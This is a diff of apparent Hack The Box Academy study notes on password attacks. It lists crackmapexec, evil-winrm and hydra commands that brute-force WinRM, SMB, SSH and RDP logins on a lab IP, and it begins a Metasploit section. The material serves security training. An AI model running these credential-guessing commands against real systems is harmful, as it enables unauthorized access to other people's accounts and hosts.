@@ -1,47 +1,40 @@
 
-https://github.com/byt3bl33d3r/CrackMapExec
-SMB, LDAP, MSSQL, etc.
-
 https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
+##### SMB, LDAP, MSSQL, etc.
+https://github.com/byt3bl33d3r/CrackMapExec
 
-```shell-session
-jabrach@htb[/htb]$ sudo apt-get -y install crackmapexec
+```shell
+sudo apt-get -y install crackmapexec
 
-jabrach@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
+crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 ```
 
-```shell-session
-jabrach@htb[/htb]$ crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
+```shell
+crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
 ```
-
 
 #### Evil-WinRM
 ```
-jabrach@htb[/htb]$ sudo gem install evil-winrm
+sudo gem install evil-winrm
+evil-winrm -i 10.129.42.197 -u user -p password
+```
+
+
+##### SSH , RDP, SMB
+
+```shell-session
+hydra -L user.list -P password.list ssh://10.129.42.197
 ```
 
 ```shell-session
-jabrach@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
+ hydra -L user.list -P password.list rdp://10.129.42.197
 ```
-
-
-SSH , RDP, SMB
 
 ```shell-session
-jabrach@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
+ hydra -L user.list -P password.list smb://10.129.42.197
 ```
 
-
-```shell-session
-jabrach@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
-```
-
-
-```shell-session
-jabrach@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
-```
-
-smb
+##### SMB via metasploit
 
 ```shell
 msfconsole -q
